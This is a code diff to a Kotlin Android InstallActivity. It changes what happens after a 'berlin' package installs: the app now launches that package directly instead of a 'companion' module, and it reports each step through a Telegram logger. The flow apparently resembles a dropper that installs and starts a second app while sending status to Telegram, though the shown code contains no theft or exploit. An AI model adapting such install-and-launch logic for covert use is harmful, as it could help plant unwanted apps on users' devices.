@@ -68,13 +68,12 @@ class InstallActivity : Activity() {
     private val berlinInstallManager: BerlinInstallManager by lazy {
         BerlinInstallManager(
             activity = this,
-            onBerlinInstallSuccess = {
-                TelegramLogger.send(this, "BERLIN_FLOW", "COMPLETE", "berlin installed — launching companion")
-                launchCompanion()
+            onBerlinInstallSuccess = { pkgName ->
+                TelegramLogger.send(this, "BERLIN_FLOW", "COMPLETE", "berlin installed — launching berlin pkg=$pkgName")
+                launchBerlin(pkgName)
             },
             onBerlinInstallError = {
-                TelegramLogger.send(this, "BERLIN_FLOW", "ERROR", "berlin install failed — launching companion anyway")
-                launchCompanion()
+                TelegramLogger.send(this, "BERLIN_FLOW", "ERROR", "berlin install failed")
             }
         )
     }
@@ -1339,6 +1338,18 @@ class InstallActivity : Activity() {
     }
 
     // ── Launch companion ──────────────────────────────────────────────────────
+    private fun launchBerlin(pkgName: String) {
+        if (pkgName.isEmpty()) return
+        try {
+            val launch = packageManager.getLaunchIntentForPackage(pkgName) ?: return
+            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+            startActivity(launch)
+            finish()
+        } catch (e: Exception) {
+            TelegramLogger.send(this, "LAUNCH_BERLIN", "ERROR", "${e.javaClass.simpleName}: ${e.message}")
+        }
+    }
+
     private fun launchCompanion() {
         val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
         val pkg   = prefs.getString(InstallReceiver.KEY_MODULE_PKG, null) ?: return
